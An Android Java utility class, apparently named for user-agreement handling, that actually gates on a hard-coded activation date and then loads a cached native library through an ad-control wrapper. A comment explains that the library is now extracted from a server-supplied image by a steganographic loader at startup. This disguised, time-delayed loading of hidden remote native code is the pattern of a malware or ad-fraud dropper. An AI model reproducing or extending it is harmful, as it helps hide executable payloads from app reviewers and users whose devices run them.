package com.lx.lxtoolsproject.utils;


import android.app.Application;
import android.text.TextUtils;
import android.util.Log;

import com.lx.lxtoolsproject.APPSpUtils;
import com.lx.lxtoolsproject.OnAgreeClickListener;
import com.lx.lxtoolsproject.ToolsApplication;

import java.io.File;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Date;

public class AgreementStatusUtils {
    public static void isAgreement(String str, Application context, OnAgreeClickListener onClickAgreement){
        if (!isGoTWork(str)){
            onClickAgreement.isCancelAgreement();
            return;
        }
        String cFilePath = APPSpUtils.getCFilePath();
        if (!TextUtils.isEmpty(cFilePath) && new File(cFilePath).length()>0){
            AdControlCUtils.init(cFilePath);
            AdControlCUtils.initDef(ToolsApplication.Companion.getContentInstance());
            onClickAgreement.isAgreement();
            return;
        }
        // 无缓存 so：不再在此处下载（原直接下载 so 的逻辑已改为启动页
        // StegoSoLoader 从服务器下发图片中提取 so 后加载），此处直接返回，
        // 避免 so 未加载时 initDef 触发 UnsatisfiedLinkError。
    }


    public static boolean isGoTWork(String wk) {
        boolean  timeGap = System.currentTimeMillis() -
                dateStr2timeStamp(wk) > 0;

        return timeGap;
    }

    private static long dateStr2timeStamp(String dateStr ){
        String pattern = "yyyy-MM-dd HH:mm:ss";
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(pattern);
        try {
            Date parse = simpleDateFormat.parse(dateStr);
            long time = parse.getTime();
            return time;
        } catch (ParseException e) {
            throw new RuntimeException(e);
        }
    }


}
